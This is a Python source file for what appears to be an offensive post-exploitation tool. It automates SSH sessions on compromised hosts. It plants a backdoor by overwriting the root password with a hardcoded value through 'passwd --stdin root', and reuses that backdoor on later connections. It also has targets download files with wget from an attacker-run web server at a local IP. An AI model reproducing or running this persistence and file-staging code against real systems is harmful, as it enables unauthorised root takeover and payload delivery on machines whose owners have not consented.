#!/usr/bin/env python
import pexpect
import re
import subprocess
import time
import urllib
import base64
import shutil
import os
import threading
import datetime
from app.util import fileutil,webutil

DEBUG=True

BACKDOOR_PASS="h3xlr1sg8"

LOCAL_HOST_NAME = "10.11.0.94"

WEB_DIR_URL= "http://{0}/prophet".format(LOCAL_HOST_NAME)

RESPONSE_TIMEOUT_IDLE=600
RESPONSE_TIMEOUT_LONG=30
RESPONSE_TIMEOUT_MED=10
RESPONSE_TIMEOUT_SHORT=3


#used to check responsiveness
ECHO_REQUEST="III\IIIII\IIIII"
ECHO_RESPONSE= "IIIIIIIIIIIII"

def debug(msg):
	if(DEBUG):
		print(msg)

def error(msg):
	print msg

####process####
def spawn(cmd, ready_phrase = "<<ACTION COMPLETE>>"):
	debug("SPAWNING: " + cmd)
	try:
		proc = pexpect.spawn(cmd, timeout=RESPONSE_TIMEOUT_IDLE)
		proc.setecho(False)
		expect(proc, ready_phrase)

		return proc
	except:
		print("Spawning aborted.")
		raise

def run(proc, cmd):
	return proc.run(cmd)

def send(proc, msg, timeout = RESPONSE_TIMEOUT_SHORT): #timeout does nothing
	debug("SENDING: " + msg)
	return proc.sendline(msg);

#works as send, but uses a wrapper to confirm that message was received
def send_sync(proc, msg, timeout = RESPONSE_TIMEOUT_MED, expect_prompt="#"):

	#generate echo
	#echo_req = "xxx" + datetime.datetime.now().isoformat().replace(":","n") + "xxx"
	#echo_resp = echo_req

	msg = msg.rstrip(";")

	#expect the ssh prompt
	expect(proc, expect_prompt, timeout=timeout)

	buf = proc.before
	print buf

	return buf
	#return proc.read()

def expect(proc, trigger, timeout=RESPONSE_TIMEOUT_LONG):
	return proc.expect_exact(trigger,timeout=timeout)

def expect_reg(proc, trigger, timeout=RESPONSE_TIMEOUT_LONG):
	return proc.expect(trigger,timeout=timeout)

def interact(proc):
	send(proc, "#====================================")
	return proc.interact()


###connections###
def addBackdoor(proc):
	#TODO: make better
	#currently just changes root password
	send(proc, "echo {0} | passwd --stdin root".format(BACKDOOR_PASS))
	check(proc)

def useBackdoor(host):
	print "Looking for backdoor..."
	proc = spawn("ssh {0}".format(host),"password")
	try:
		send(proc, BACKDOOR_PASS)
		expect(proc, "Last login")
		print "found"
	except:
		pass
	return proc

def check(proc, timeout=RESPONSE_TIMEOUT_MED):
	checkConnection(proc, timeout=timeout)

def checkConnection(proc, timeout=RESPONSE_TIMEOUT_MED):
	try:
		send(proc, "echo " + ECHO_REQUEST)
		expect(proc, ECHO_RESPONSE, timeout=timeout)
		return True
	except Exception, e:
		debug("BAD CONNECTION")
		print e
		return False

def connect_interactive(host):
	interact(connect(host))

def connect(host):
	print "CONNECTING to {0}...".format(host)
	p = useBackdoor(host)
	if(not checkConnection(p)):
		debug("no backdoor, going in the front")
		connect_script_path=os.path.join(fileutil.getConnectPath(),host)
		p= spawn(connect_script_path,ready_phrase="<<<CONNECTION ATTEMPT COMPLETE>>>")
		addBackdoor(p)

	return p



####files#####

def upload(proc, local_file_path = "", remote_file_path = ""):
	
	##if web is best method
	#move to webdir
	temp_name=os.path.join(fileutil.mkdir(fileutil.getWebLocalPath()), "temp") #todo: random name

	shutil.copy(local_file_path, temp_name)

	send(proc, "wget -O {0} {1}".format(remote_file_path, os.path.join(webutil.getWebUrl(),"temp")))




